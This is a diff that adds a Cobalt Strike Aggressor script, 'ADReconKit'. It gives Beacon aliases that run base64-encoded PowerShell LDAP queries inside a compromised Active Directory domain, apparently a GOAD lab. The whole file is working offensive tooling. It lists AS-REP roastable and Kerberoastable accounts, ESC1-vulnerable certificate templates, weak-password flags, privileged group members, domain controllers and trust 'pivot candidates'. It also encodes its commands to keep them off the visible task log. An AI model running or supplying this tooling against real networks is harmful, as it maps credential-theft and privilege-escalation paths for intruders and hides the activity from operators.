@@ -1,0 +1,351 @@
+########################################
+# ADReconKit — short aliases for the ADSI one-liners in BangunBof2.txt
+#
+# These run through Beacon's powershell command (fork&run), the same
+# path that already works in the lab. In-process BOF was killing Beacon.
+########################################
+
+# north.sevenkingdoms.local -> DC=north,DC=sevenkingdoms,DC=local
+sub fqdn_to_dn
+{
+    local('$fqdn $part $dn');
+    $fqdn = $1;
+    $dn = "";
+    if ($fqdn eq "") { return ""; }
+    if (lc(substr($fqdn, 0, 3)) eq "dc=") { return $fqdn; }
+    foreach $part (split('\\.', $fqdn))
+    {
+        if ($dn eq "")
+        {
+            $dn = "DC=" . $part;
+        }
+        else
+        {
+            $dn = $dn . ",DC=" . $part;
+        }
+    }
+    return $dn;
+}
+
+sub adrecon_usage_check
+{
+    local('$bid $cmd $ip $domain');
+    $bid    = $1;
+    $cmd    = $2;
+    $ip     = $3;
+    $domain = $4;
+    if ($ip eq "" || $domain eq "")
+    {
+        berror($bid, "[-] Usage: " . $cmd . " <IP> <DomainFQDN>");
+        berror($bid, "[-] Example: " . $cmd . " 192.168.56.11 north.sevenkingdoms.local");
+        return 0;
+    }
+    return 1;
+}
+
+# Run PowerShell without btask / "Tasked beacon to run: ..." in the console.
+# EncodedCommand keeps the one-liner off the visible task line.
+sub adrecon_exec
+{
+    local('$bid $ps $enc $args');
+    $bid = $1;
+    $ps  = "\$ProgressPreference='SilentlyContinue'; \$WarningPreference='SilentlyContinue'; \$VerbosePreference='SilentlyContinue'; " . $2;
+    $enc = base64_encode(str_encode($ps, "UTF-16LE"));
+    $args = " -nop -noni -exec bypass -EncodedCommand " . $enc;
+    beacon_execute_job($bid, "powershell", $args, 1);
+}
+
+# Bind LDAP://IP/DN then run $body (Sleep single-quoted PS, so $vars reach PowerShell)
+sub adrecon_ldap
+{
+    local('$bid $title $ip $domain $dn $body $cmd');
+    $bid    = $1;
+    $title  = $2;
+    $ip     = $3;
+    $domain = $4;
+    $body   = $5;
+    $dn     = fqdn_to_dn($domain);
+
+    $cmd = "Write-Output '[*] --------------------------------------------'; Write-Output '[*] ADReconKit - " . $title . "'; Write-Output '[*] Target : " . $ip . "'; Write-Output '[*] Domain : " . $domain . "'; Write-Output '[*] DN     : " . $dn . "'; Write-Output '[*] --------------------------------------------'; \$o = [ADSI]('LDAP://" . $ip . "/" . $dn . "'); \$searcher = [ADSISearcher]\$o; \$searcher.PageSize = 1000; \$searcher.SearchScope = 'Subtree'; " . $body;
+    adrecon_exec($bid, $cmd);
+}
+
+# Bind a specific LDAP path (GPO / trusts / templates / sites)
+sub adrecon_ldap_path
+{
+    local('$bid $title $ip $path $body $cmd');
+    $bid   = $1;
+    $title = $2;
+    $ip    = $3;
+    $path  = $4;
+    $body  = $5;
+
+    $cmd = "Write-Output '[*] --------------------------------------------'; Write-Output '[*] ADReconKit - " . $title . "'; Write-Output '[*] Target : " . $ip . "'; Write-Output '[*] DN     : " . $path . "'; Write-Output '[*] --------------------------------------------'; \$o = [ADSI]('LDAP://" . $ip . "/" . $path . "'); \$searcher = [ADSISearcher]\$o; \$searcher.PageSize = 1000; \$searcher.SearchScope = 'Subtree'; " . $body;
+    adrecon_exec($bid, $cmd);
+}
+
+# rootDSE -> configurationNamingContext, then bind $prefix,$config
+sub adrecon_ldap_config
+{
+    local('$bid $title $ip $prefix $body $cmd');
+    $bid    = $1;
+    $title  = $2;
+    $ip     = $3;
+    $prefix = $4;
+    $body   = $5;
+
+    $cmd = "Write-Output '[*] --------------------------------------------'; Write-Output '[*] ADReconKit - " . $title . "'; Write-Output '[*] Target : " . $ip . "'; Write-Output '[*] --------------------------------------------'; \$root = [ADSI]('LDAP://" . $ip . "/rootDSE'); \$config = [string]\$root.Properties['configurationNamingContext'][0]; Write-Output ('[*] Config DN : ' + \$config); \$path = '" . $prefix . ",' + \$config; Write-Output ('[*] DN     : ' + \$path); \$o = [ADSI]('LDAP://" . $ip . "/' + \$path); \$searcher = [ADSISearcher]\$o; \$searcher.PageSize = 1000; \$searcher.SearchScope = 'Subtree'; " . $body;
+    adrecon_exec($bid, $cmd);
+}
+
+########################################
+# PowerShell bodies — same filters as BangunBof2.txt
+########################################
+
+sub ps_asrep
+{
+    return '$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $u=$r.Properties.samaccountname[0]; Write-Output ("[+] " + $u + " (vuln AS-REP Roasting)") }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_kerberoast
+{
+    return '$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $u=$r.Properties.samaccountname[0]; Write-Output ("[+] " + $u + " (vuln KerbeRoasting)"); if($r.Properties.serviceprincipalname){ foreach($s in $r.Properties.serviceprincipalname){ Write-Output ("[+]    SPN: " + $s) } } }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_users
+{
+    return '$searcher.Filter = "(&(objectCategory=person)(objectClass=user))"; $n=0; foreach($r in $searcher.FindAll()){ $n++; Write-Output ("[+] " + $r.Properties.samaccountname[0]) }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_userdesc
+{
+    return '$searcher.Filter = "(&(objectCategory=person)(objectClass=user))"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $u=$r.Properties.samaccountname[0]; $name=if($r.Properties.displayname){$r.Properties.displayname[0]}else{""}; $d=if($r.Properties.description){$r.Properties.description[0]}else{""}; Write-Output ("[+] User        : " + $u); Write-Output ("[+]   Name      : " + $name); Write-Output ("[+]   Description: " + $d) }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_computers
+{
+    return '$searcher.Filter = "(objectClass=computer)"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $u=$r.Properties.samaccountname[0]; $os=if($r.Properties.operatingsystem){[string]$r.Properties.operatingsystem[0]}else{""}; $ver=if($r.Properties.operatingsystemversion){[string]$r.Properties.operatingsystemversion[0]}else{""}; $low=$os.ToLower(); $flag=""; if($low -match "windows xp|windows vista|windows 7|windows 8|windows 2000|windows nt|server 2003|server 2008|server 2012"){ $flag="  [OUTDATED / HIGH RISK]" }; Write-Output ("[+] " + $u + "  OS=" + $os + "  Ver=" + $ver + $flag) }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_esc1
+{
+    return '$searcher.Filter = "(objectClass=pKICertificateTemplate)"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $cn=$r.Properties.cn[0]; $nameFlag=if($r.Properties."mspki-certificate-name-flag"){[int]$r.Properties."mspki-certificate-name-flag"[0]}else{0}; $enroll=if($r.Properties."mspki-enrollment-flag"){[int]$r.Properties."mspki-enrollment-flag"[0]}else{0}; $san=(($nameFlag -band 1) -eq 1); $ekus=@(); if($r.Properties.pkiextendedkeyusage){ $ekus=@($r.Properties.pkiextendedkeyusage) }; $ekuStr=if($ekus.Count -gt 0){($ekus -join ", ")}else{"(none / Any Purpose)"}; $client=$false; if($ekus.Count -eq 0){ $client=$true }; foreach($e in $ekus){ if($e -eq "1.3.6.1.5.5.7.3.2" -or $e -eq "1.3.6.1.4.1.311.20.2.2" -or $e -eq "2.5.29.37.0"){ $client=$true } }; Write-Output ("[+] Template : " + $cn); if($san){ Write-Output "[+]   SAN    : YES (Vulnerable SAN)" } else { Write-Output "[+]   SAN    : NO" }; Write-Output ("[+]   EKU    : " + $ekuStr); if($san -and $client){ Write-Output "[+]   ESC1   : LIKELY VULNERABLE" } else { Write-Output "[+]   ESC1   : No" } }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_pwnever
+{
+    return '$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $u=$r.Properties.samaccountname[0]; $name=if($r.Properties.displayname){$r.Properties.displayname[0]}else{""}; if($name -ne ""){ Write-Output ("[+] " + $u + "    Name: " + $name) } else { Write-Output ("[+] " + $u) } }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_notreqd
+{
+    return '$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $u=$r.Properties.samaccountname[0]; $name=if($r.Properties.displayname){$r.Properties.displayname[0]}else{""}; if($name -ne ""){ Write-Output ("[+] " + $u + "    Name: " + $name) } else { Write-Output ("[+] " + $u) } }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_disabled
+{
+    return '$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $u=$r.Properties.samaccountname[0]; $d=if($r.Properties.description){$r.Properties.description[0]}else{""}; Write-Output ("[+] DisabledUser: " + $u + "    Description: " + $d) }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_admin_filter
+{
+    return '$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(memberOf=' . $1 . '))"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $u=$r.Properties.samaccountname[0]; $name=if($r.Properties.displayname){$r.Properties.displayname[0]}else{""}; Write-Output ("[+] " + $u + "    Name: " + $name) }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_gpo
+{
+    return '$searcher.Filter = "(objectClass=groupPolicyContainer)"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $g=if($r.Properties.displayname){$r.Properties.displayname[0]}else{""}; $c=if($r.Properties.cn){$r.Properties.cn[0]}else{""}; $p=if($r.Properties.gpcfilesyspath){$r.Properties.gpcfilesyspath[0]}else{""}; Write-Output ("[+] GPOName    : " + $g); Write-Output ("[+]   GUID     : " + $c); Write-Output ("[+]   SYSVOL   : " + $p) }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_dcs_uac
+{
+    return '$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $u=$r.Properties.samaccountname[0]; $os=if($r.Properties.operatingsystem){$r.Properties.operatingsystem[0]}else{""}; $uac=if($r.Properties.useraccountcontrol){[int]$r.Properties.useraccountcontrol[0]}else{0}; if(($uac -band 0x04000000) -ne 0){ Write-Output ("[+] DCName: " + $u + "    OS: " + $os + "    [RODC]") } else { Write-Output ("[+] DCName: " + $u + "    OS: " + $os) } }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_dcs_pgid
+{
+    return '$searcher.Filter = "(&(objectCategory=computer)(primaryGroupID=' . $1 . '))"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $u=$r.Properties.samaccountname[0]; $os=if($r.Properties.operatingsystem){$r.Properties.operatingsystem[0]}else{""}; Write-Output ("[+] DCName: " + $u + "    OS: " + $os) }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_trusts
+{
+    return '$searcher.Filter = "(objectClass=trustedDomain)"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $cn=if($r.Properties.cn){$r.Properties.cn[0]}else{$r.Properties.trustpartner[0]}; $dir=if($r.Properties.trustdirection){[int]$r.Properties.trustdirection[0]}else{0}; $typ=if($r.Properties.trusttype){[int]$r.Properties.trusttype[0]}else{0}; $attr=if($r.Properties.trustattributes){[int]$r.Properties.trustattributes[0]}else{0}; $dirStr=switch($dir){1{"Inbound"}2{"Outbound"}3{"Bidirectional"}default{"Unknown"}}; $typStr=switch($typ){1{"Downlevel (NT)"}2{"Uplevel (AD)"}3{"MIT"}4{"DCE"}default{"Unknown"}}; Write-Output ("[+] TargetDomain  : " + $cn); Write-Output ("[+]   Direction   : " + $dirStr + " (" + $dir + ")"); Write-Output ("[+]   Type        : " + $typStr + " (" + $typ + ")"); Write-Output ("[+]   Attributes  : 0x" + ("{0:X8}" -f $attr)); if($dir -eq 1){ Write-Output "[+]   Note        : Inbound - target trusts us" } elseif($dir -eq 2){ Write-Output "[+]   Note        : Outbound - we trust target (pivot candidate)" } elseif($dir -eq 3){ Write-Output "[+]   Note        : Bidirectional - parent-child ExtraSID / SID History possible" } }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+sub ps_sites
+{
+    return '$searcher.Filter = "(objectClass=subnet)"; $n=0; foreach($r in $searcher.FindAll()){ $n++; $cn=$r.Properties.cn[0]; $siteDN=if($r.Properties.siteobject){[string]$r.Properties.siteobject[0]}else{""}; $desc=if($r.Properties.description){$r.Properties.description[0]}else{""}; $site="Unassigned"; if($siteDN -ne ""){ $site = ($siteDN -split ",")[0] -replace "^CN=","" }; Write-Output ("[+] Subnet      : " + $cn); Write-Output ("[+]   Site      : " + $site); Write-Output ("[+]   Description: " + $desc) }; if($n -eq 0){ Write-Output "[-] No results found" } else { Write-Output ("[*] Total: " + $n + " object(s)") }';
+}
+
+########################################
+# Aliases
+########################################
+
+alias adrecon_asrep
+{
+    if (!adrecon_usage_check($1, "adrecon_asrep", $2, $3)) { return; }
+    adrecon_ldap($1, "AS-REP Roasting", $2, $3, ps_asrep());
+}
+
+alias adrecon_kerberoast
+{
+    if (!adrecon_usage_check($1, "adrecon_kerberoast", $2, $3)) { return; }
+    adrecon_ldap($1, "Kerberoasting", $2, $3, ps_kerberoast());
+}
+
+alias adrecon_users
+{
+    if (!adrecon_usage_check($1, "adrecon_users", $2, $3)) { return; }
+    adrecon_ldap($1, "Enumerate Users", $2, $3, ps_users());
+}
+
+alias adrecon_userdesc
+{
+    if (!adrecon_usage_check($1, "adrecon_userdesc", $2, $3)) { return; }
+    adrecon_ldap($1, "Users with Description", $2, $3, ps_userdesc());
+}
+
+alias adrecon_computers
+{
+    if (!adrecon_usage_check($1, "adrecon_computers", $2, $3)) { return; }
+    adrecon_ldap($1, "Computers / Outdated OS", $2, $3, ps_computers());
+}
+
+alias adrecon_esc1
+{
+    if (!adrecon_usage_check($1, "adrecon_esc1", $2, $3)) { return; }
+    adrecon_ldap_config($1, "ADCS ESC1 (SAN / EKU)", $2, "CN=Certificate Templates,CN=Public Key Services,CN=Services", ps_esc1());
+}
+
+alias adrecon_pwnever
+{
+    if (!adrecon_usage_check($1, "adrecon_pwnever", $2, $3)) { return; }
+    adrecon_ldap($1, "Password Never Expires", $2, $3, ps_pwnever());
+}
+
+alias adrecon_weakpwd
+{
+    if (!adrecon_usage_check($1, "adrecon_weakpwd", $2, $3)) { return; }
+    adrecon_ldap($1, "PASSWD_NOTREQD (blank / weak / default possible)", $2, $3, ps_notreqd());
+    adrecon_ldap($1, "Disabled Accounts", $2, $3, ps_disabled());
+}
+
+alias adrecon_admins
+{
+    local('$bid $ip $domain $dn');
+    if (!adrecon_usage_check($1, "adrecon_admins", $2, $3)) { return; }
+    $bid = $1; $ip = $2; $domain = $3;
+    $dn = fqdn_to_dn($domain);
+    adrecon_ldap($bid, "Domain Admins", $ip, $domain, ps_admin_filter("CN=Domain Admins,CN=Users," . $dn));
+    adrecon_ldap($bid, "Administrators (Builtin)", $ip, $domain, ps_admin_filter("CN=Administrators,CN=Builtin," . $dn));
+    adrecon_ldap($bid, "Account Operators", $ip, $domain, ps_admin_filter("CN=Account Operators,CN=Builtin," . $dn));
+    adrecon_ldap($bid, "Backup Operators", $ip, $domain, ps_admin_filter("CN=Backup Operators,CN=Builtin," . $dn));
+    adrecon_ldap($bid, "Server Operators", $ip, $domain, ps_admin_filter("CN=Server Operators,CN=Builtin," . $dn));
+    adrecon_ldap($bid, "Print Operators", $ip, $domain, ps_admin_filter("CN=Print Operators,CN=Builtin," . $dn));
+    adrecon_ldap($bid, "DnsAdmins", $ip, $domain, ps_admin_filter("CN=DnsAdmins,CN=Users," . $dn));
+}
+
+alias adrecon_gpo
+{
+    local('$dn');
+    if (!adrecon_usage_check($1, "adrecon_gpo", $2, $3)) { return; }
+    $dn = fqdn_to_dn($3);
+    adrecon_ldap_path($1, "GPO Locations", $2, "CN=Policies,CN=System," . $dn, ps_gpo());
+}
+
+alias adrecon_dcs
+{
+    if (!adrecon_usage_check($1, "adrecon_dcs", $2, $3)) { return; }
+    adrecon_ldap($1, "Domain Controllers (UAC SERVER_TRUST_ACCOUNT=8192)", $2, $3, ps_dcs_uac());
+    adrecon_ldap($1, "Writable Domain Controllers (primaryGroupID=516)", $2, $3, ps_dcs_pgid("516"));
+    adrecon_ldap($1, "Read-Only Domain Controllers (primaryGroupID=521)", $2, $3, ps_dcs_pgid("521"));
+}
+
+alias adrecon_trusts
+{
+    local('$dn');
+    if (!adrecon_usage_check($1, "adrecon_trusts", $2, $3)) { return; }
+    $dn = fqdn_to_dn($3);
+    adrecon_ldap_path($1, "Domain Trust Mapping", $2, "CN=System," . $dn, ps_trusts());
+}
+
+alias adrecon_sites
+{
+    if (!adrecon_usage_check($1, "adrecon_sites", $2, $3)) { return; }
+    adrecon_ldap_config($1, "Subnet & Site Topology", $2, "CN=Subnets,CN=Sites", ps_sites());
+}
+
+alias adrecon_all
+{
+    local('$bid $ip $domain $dn');
+    if (!adrecon_usage_check($1, "adrecon_all", $2, $3)) { return; }
+    $bid = $1; $ip = $2; $domain = $3; $dn = fqdn_to_dn($domain);
+    adrecon_ldap($bid, "AS-REP Roasting", $ip, $domain, ps_asrep());
+    adrecon_ldap($bid, "Kerberoasting", $ip, $domain, ps_kerberoast());
+    adrecon_ldap($bid, "Enumerate Users", $ip, $domain, ps_users());
+    adrecon_ldap($bid, "Users with Description", $ip, $domain, ps_userdesc());
+    adrecon_ldap($bid, "Computers / Outdated OS", $ip, $domain, ps_computers());
+    adrecon_ldap_config($bid, "ADCS ESC1 (SAN / EKU)", $ip, "CN=Certificate Templates,CN=Public Key Services,CN=Services", ps_esc1());
+    adrecon_ldap($bid, "Password Never Expires", $ip, $domain, ps_pwnever());
+    adrecon_ldap($bid, "PASSWD_NOTREQD (blank / weak / default possible)", $ip, $domain, ps_notreqd());
+    adrecon_ldap($bid, "Disabled Accounts", $ip, $domain, ps_disabled());
+    adrecon_ldap($bid, "Domain Admins", $ip, $domain, ps_admin_filter("CN=Domain Admins,CN=Users," . $dn));
+    adrecon_ldap($bid, "Administrators (Builtin)", $ip, $domain, ps_admin_filter("CN=Administrators,CN=Builtin," . $dn));
+    adrecon_ldap($bid, "Account Operators", $ip, $domain, ps_admin_filter("CN=Account Operators,CN=Builtin," . $dn));
+    adrecon_ldap($bid, "Backup Operators", $ip, $domain, ps_admin_filter("CN=Backup Operators,CN=Builtin," . $dn));
+    adrecon_ldap($bid, "Server Operators", $ip, $domain, ps_admin_filter("CN=Server Operators,CN=Builtin," . $dn));
+    adrecon_ldap($bid, "Print Operators", $ip, $domain, ps_admin_filter("CN=Print Operators,CN=Builtin," . $dn));
+    adrecon_ldap($bid, "DnsAdmins", $ip, $domain, ps_admin_filter("CN=DnsAdmins,CN=Users," . $dn));
+    adrecon_ldap_path($bid, "GPO Locations", $ip, "CN=Policies,CN=System," . $dn, ps_gpo());
+    adrecon_ldap($bid, "Domain Controllers (UAC SERVER_TRUST_ACCOUNT=8192)", $ip, $domain, ps_dcs_uac());
+    adrecon_ldap($bid, "Writable Domain Controllers (primaryGroupID=516)", $ip, $domain, ps_dcs_pgid("516"));
+    adrecon_ldap($bid, "Read-Only Domain Controllers (primaryGroupID=521)", $ip, $domain, ps_dcs_pgid("521"));
+    adrecon_ldap_path($bid, "Domain Trust Mapping", $ip, "CN=System," . $dn, ps_trusts());
+    adrecon_ldap_config($bid, "Subnet & Site Topology", $ip, "CN=Subnets,CN=Sites", ps_sites());
+}
+
+########################################
+# Help
+########################################
+
+beacon_command_register("adrecon_all", "Run all ADReconKit ADSI recon modules",
+    "\nUsage: adrecon_all <IP> <DomainFQDN>\n\nExample: adrecon_all 192.168.56.11 north.sevenkingdoms.local\n");
+
+beacon_command_register("adrecon_asrep", "Find users without Kerberos pre-auth (AS-REP Roast)",
+    "\nUsage: adrecon_asrep <IP> <DomainFQDN>\n\nLDAP: userAccountControl bit DONT_REQ_PREAUTH (4194304)\n\nExample: adrecon_asrep 192.168.56.11 north.sevenkingdoms.local\nOutput: Catelyn.stark (vuln AS-REP Roasting)\n");
+
+beacon_command_register("adrecon_kerberoast", "Find user accounts with an SPN (Kerberoast)",
+    "\nUsage: adrecon_kerberoast <IP> <DomainFQDN>\n\nExample: adrecon_kerberoast 192.168.56.11 north.sevenkingdoms.local\nOutput: sqlsvc (vuln KerbeRoasting)\n");
+
+beacon_command_register("adrecon_users", "Enumerate domain user sAMAccountName values",
+    "\nUsage: adrecon_users <IP> <DomainFQDN>\n\nExample: adrecon_users 192.168.56.11 north.sevenkingdoms.local\n");
+
+beacon_command_register("adrecon_userdesc", "Enumerate users with displayName and description",
+    "\nUsage: adrecon_userdesc <IP> <DomainFQDN>\n\nExample: adrecon_userdesc 192.168.56.11 north.sevenkingdoms.local\n");
+
+beacon_command_register("adrecon_computers", "Enumerate computers and flag outdated OS",
+    "\nUsage: adrecon_computers <IP> <DomainFQDN>\n\nExample: adrecon_computers 192.168.56.11 north.sevenkingdoms.local\n");
+
+beacon_command_register("adrecon_esc1", "Enumerate certificate templates for ESC1 (SAN)",
+    "\nUsage: adrecon_esc1 <IP> <DomainFQDN>\n\nExample: adrecon_esc1 192.168.56.10 sevenkingdoms.local\n");
+
+beacon_command_register("adrecon_pwnever", "Find accounts with password never expires",
+    "\nUsage: adrecon_pwnever <IP> <DomainFQDN>\n\nExample: adrecon_pwnever 192.168.56.11 north.sevenkingdoms.local\n");
+
+beacon_command_register("adrecon_weakpwd", "Find PASSWD_NOTREQD and disabled accounts",
+    "\nUsage: adrecon_weakpwd <IP> <DomainFQDN>\n\nExample: adrecon_weakpwd 192.168.56.11 north.sevenkingdoms.local\n");
+
+beacon_command_register("adrecon_admins", "Enumerate Domain Admins and privileged groups",
+    "\nUsage: adrecon_admins <IP> <DomainFQDN>\n\nExample: adrecon_admins 192.168.56.11 north.sevenkingdoms.local\n");
+
+beacon_command_register("adrecon_gpo", "Enumerate Group Policy Objects and SYSVOL paths",
+    "\nUsage: adrecon_gpo <IP> <DomainFQDN>\n\nExample: adrecon_gpo 192.168.56.11 north.sevenkingdoms.local\n");
+
+beacon_command_register("adrecon_dcs", "Discover Domain Controllers and RODCs",
+    "\nUsage: adrecon_dcs <IP> <DomainFQDN>\n\nExample: adrecon_dcs 192.168.56.11 north.sevenkingdoms.local\n");
+
+beacon_command_register("adrecon_trusts", "Map inbound / outbound / bidirectional domain trusts",
+    "\nUsage: adrecon_trusts <IP> <DomainFQDN>\n\nExample: adrecon_trusts 192.168.56.11 north.sevenkingdoms.local\n");
+
+beacon_command_register("adrecon_sites", "Map AD subnets and sites from Configuration NC",
+    "\nUsage: adrecon_sites <IP> <DomainFQDN>\n\nExample: adrecon_sites 192.168.56.10 sevenkingdoms.local\n");
